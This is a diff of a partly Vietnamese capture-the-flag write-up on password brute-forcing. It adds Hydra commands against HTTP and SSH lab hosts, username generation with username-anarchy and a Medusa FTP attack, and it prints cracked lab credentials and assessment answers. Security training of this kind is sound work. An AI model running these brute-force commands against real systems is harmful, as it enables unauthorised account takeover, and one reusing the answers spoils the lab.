@@ -44,7 +44,7 @@ Sau khi tạo mật khẩu, có thể lọc ra các mật khẩu phù hợp vớ
 Ví dụ lọc mật khẩu:
 
 ```bash
-grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+
 ```
 
 #### **3. Sử dụng Hydra để Tấn Công Brute-Force**:
@@ -72,3 +72,43 @@ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]'
 hydra -L usernames.txt -P jane-filtered.txt 83.136.253.59 -s 49534 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 ![alt text](image.png)
 Log on and get flag
+
+## Skill Assessment
+Part1
+![alt text](image-1.png)
+tấn công http-get
+```bash
+ hydra -I \
+  -L top-usernames-shortlist.txt \
+  -P 2023-200_most_used_passwords.txt \
+  -s 32344 -t 16 -f -V \
+  94.237.48.12 http-get / \
+  -o found.txt
+```      
+[32344][http-get] host: 94.237.48.12   login: admin   password: Admin123
+remember wget raw link from  
+https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+
+Answer: satwossh
+hydra -l satwossh -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt ssh://94.237.60.18:57621
+Got credentials: login: satwossh password: password1
+Now ssh into the target:
+ssh satwossh@94.237.122.12 -p45413
+Found good files and a convenient tool:
+Got hints from the report:
+
+Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.
+![alt text](image-3.png)
+
+All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
+I used username-anarchy with Thomas Smith:
+./username-anarchy/username-anarchy Thomas Smith > thomas_smith_usernames.txt
+finally happy attack time:
+medusa -h 127.0.0.1 -U thomas_smith_usernames.txt -P passwords.txt -M ftp -t 5 | grep SUCCESS
+Got the credentials thomas:chocolate!.
+![alt text](image-4.png)
+ftp ftp://thomas@localhost
+ls
+get flag.txt
+!cat flag.txt
